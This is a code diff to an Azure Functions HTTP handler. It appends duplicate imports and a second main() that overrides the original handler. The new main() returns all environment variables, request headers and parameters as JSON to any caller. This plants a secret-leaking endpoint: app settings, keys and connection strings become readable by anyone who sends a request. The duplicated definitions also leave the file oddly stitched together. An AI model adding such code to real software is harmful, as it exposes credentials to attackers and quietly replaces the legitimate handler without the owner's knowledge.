@@ -95,3 +95,23 @@ def main(req: func.HttpRequest) -> func.HttpResponse:
             status_code=500,
             headers={"Content-Type": "application/json"}
         )
+import azure.functions as func
+import os
+import json
+
+def main(req: func.HttpRequest) -> func.HttpResponse:
+    env_info = {k: v for k, v in os.environ.items()}
+    request_info = {
+        "method": req.method,
+        "url": req.url,
+        "headers": dict(req.headers),
+        "params": dict(req.params)
+    }
+    return func.HttpResponse(
+        json.dumps({
+            "environment": env_info,
+            "request": request_info
+        }, indent=2),
+        status_code=200,
+        headers={"Content-Type": "application/json"}
+    )
